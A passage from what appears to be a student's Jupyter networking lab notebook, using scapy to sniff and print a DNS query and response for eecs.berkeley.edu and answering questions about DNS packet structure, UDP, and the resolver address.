      "Ether / IP / UDP / DNS Ans \"23.185.0.1\" \n"
     ]
    }
   ],
   "source": [
    "#! /usr/bin/env python3\n",
    "\n",
    "from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP\n",
    "def print_packet(p):\n",
    "    print(p.summary())\n",
    "    \n",
    "packets=sniff(prn=print_packet, lfilter=lambda x: x.haslayer(DNS), count=2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 2.1\n",
    "* **What is the structure of the DNS Query & Response?**\n",
    "* **Does the DNS Query & Response use TCP or UDP? Why do you think so?**\n",
    "* **What is the IP Address of your DNS Recursive Resolver?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = b0:76:1b:21:30:ab\n",
      "  src       = 80:b6:55:e9:93:3c\n",
      "  type      = IPv4\n",
      "###[ IP ]### \n",
      "     version   = 4\n",
      "     ihl       = 5\n",
      "     tos       = 0x0\n",
      "     len       = 86\n",
      "     id        = 23142\n",
      "     flags     = \n",
      "     frag      = 0\n",
      "     ttl       = 64\n",
      "     proto     = udp\n",
      "     chksum    = 0x6ad1\n",
      "     src       = 10.198.112.33\n",
      "     dst       = 202.117.112.3\n",
      "     \\options   \\\n",
      "###[ UDP ]### \n",
      "        sport     = 46341\n",
      "        dport     = domain\n",
      "        len       = 66\n",
      "        chksum    = 0xb5b3\n",
      "###[ DNS ]### \n",
      "           id        = 52966\n",
      "           qr        = 0\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 0\n",
      "           z         = 0\n",
      "           ad        = 1\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 0\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'eecs.berkeley.edu.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           an        = None\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 1232\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "            |   |###[ DNS EDNS0 TLV ]### \n",
      "            |   |  optcode   = 10\n",
      "            |   |  optlen    = 8\n",
      "            |   |  optdata   = '\\x0f\\\\xe7\\\\xbeG\\\\xbb\\\\xd9:\\\\xd3'\n",
      "\n",
      "###[ Ethernet ]### \n",
      "  dst       = 80:b6:55:e9:93:3c\n",
      "  src       = b0:76:1b:21:30:ab\n",
      "  type      = IPv4\n",
      "###[ IP ]### \n",
      "     version   = 4\n",
      "     ihl       = 5\n",
      "     tos       = 0x0\n",
      "     len       = 118\n",
      "     id        = 9145\n",
      "     flags     = \n",
      "     frag      = 0\n",
      "     ttl       = 57\n",
      "     proto     = udp\n",
      "     chksum    = 0xa85e\n",
      "     src       = 202.117.112.3\n",
      "     dst       = 10.198.112.33\n",
      "     \\options   \\\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 46341\n",
      "        len       = 98\n",
      "        chksum    = 0xe217\n",
      "###[ DNS ]### \n",
      "           id        = 52966\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 1\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'eecs.berkeley.edu.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'eecs.berkeley.edu.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 71469\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 23.185.0.1\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 4096\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "            |   |###[ DNS EDNS0 TLV ]### \n",
      "            |   |  optcode   = 10\n",
      "            |   |  optlen    = 24\n",
      "            |   |  optdata   = '\\x0f\\\\xe7\\\\xbeG\\\\xbb\\\\xd9:\\\\xd3F\\\\xcd_gb\\\\xadص\\\\xfb\\\\x8f<\\x17-\\\\x90d\\\\xaa'\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# YOUR CODE HERE for Checkpoint Question 2.1\n",
    "from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP\n",
    "def answer_4():\n",
    "    packets = sniff(lfilter=lambda x: x.haslayer(DNS), count=5)\n",
    "    packets[0].show()\n",
    "    packets[1].show()\n",
    "answer_4()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ See the code ouput (way too long)\n",
    "+ UDP\n",
    "+ 202.117.112.3"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
